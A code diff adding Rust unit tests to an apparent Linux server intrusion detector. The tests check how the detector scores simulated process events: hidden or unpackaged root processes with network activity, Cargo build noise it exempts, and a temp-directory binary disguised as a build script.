+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let event = process_event(
+            "/usr/local/bin/sync-agent",
+            "sync-agent",
+            "/usr/local/bin/sync-agent --worker",
+        )
+        .with_field("cwd", "/root")
+        .with_field("euid", "0")
+        .with_field("parent_name", "bash")
+        .with_field("socket_fd_count", "4")
+        .with_field("public_outbound_count", "1")
+        .with_field("process_age_seconds", "180.0")
+        .with_field("package_owner_state", "unowned");
+
+        let assessment = behavior_cluster_assessment(&event, &ctx);
+
+        assert!(assessment.is_some_and(|assessment| {
+            assessment.is_suspicious(70)
+                && assessment.has_feature("unpackaged_network_process")
+                && assessment.has_feature("shell_or_scheduler_parent")
+        }));
+    }
+
+    #[test]
+    fn behavior_cluster_detects_short_lived_hidden_network_process() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let event = process_event(
+            "/usr/local/bin/.sync-agent",
+            ".sync-agent",
+            "/usr/local/bin/.sync-agent --worker",
+        )
+        .with_field("cwd", "/root")
+        .with_field("euid", "0")
+        .with_field("parent_name", "bash")
+        .with_field("socket_fd_count", "4")
+        .with_field("public_outbound_count", "1")
+        .with_field("process_age_seconds", "0.4")
+        .with_field("package_owner_state", "unowned");
+
+        let assessment = behavior_cluster_assessment(&event, &ctx);
+
+        assert!(assessment.is_some_and(|assessment| {
+            assessment.is_suspicious(70)
+                && assessment.has_feature("hidden_executable_name")
+                && assessment.has_feature("unpackaged_network_process")
+        }));
+    }
+
+    #[test]
+    fn rust_source_build_context_suppresses_cargo_behavior_noise() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let cargo = process_event("/root/.cargo/bin/cargo", "cargo", "cargo build --release")
+            .with_field("cwd", "/tmp/vps-sentinel-build")
+            .with_field("euid", "0")
+            .with_field("cpu_percent", "95.0")
+            .with_field("process_age_seconds", "240.0")
+            .with_field("socket_fd_count", "1")
+            .with_field("parent_name", "bash");
+
+        let findings = ProcessDetector.detect(&[cargo], &ctx);
+
+        assert!(findings.iter().all(|finding| finding.rule_id != "PROC-005"));
+    }
+
+    #[test]
+    fn rust_build_script_under_target_suppresses_temp_path_noise() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let build_script = process_event(
+            "/tmp/vps-sentinel-build/target/release/build/ring-abc/build-script-build",
+            "build-script-build",
+            "/tmp/vps-sentinel-build/target/release/build/ring-abc/build-script-build",
+        )
+        .with_field(
+            "cwd",
+            "/tmp/vps-sentinel-build/target/release/build/ring-abc",
+        )
+        .with_field("euid", "0")
+        .with_field("parent_name", "cargo");
+
+        let findings = ProcessDetector.detect(&[build_script], &ctx);
+
+        assert!(findings.iter().all(|finding| finding.rule_id != "PROC-001"));
+    }
+
+    #[test]
+    fn temp_payload_named_like_build_script_still_alerts_without_build_context() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let payload = process_event(
+            "/tmp/.cache/build-script-build",
+            "build-script-build",
+            "/tmp/.cache/build-script-build --serve",
+        )
+        .with_field("cwd", "/tmp/.cache")
+        .with_field("euid", "0")
+        .with_field("socket_fd_count", "2");
+
+        let findings = ProcessDetector.detect(&[payload], &ctx);
+
+        assert!(findings.iter().any(|finding| finding.rule_id == "PROC-001"));
     }
 
     #[test]
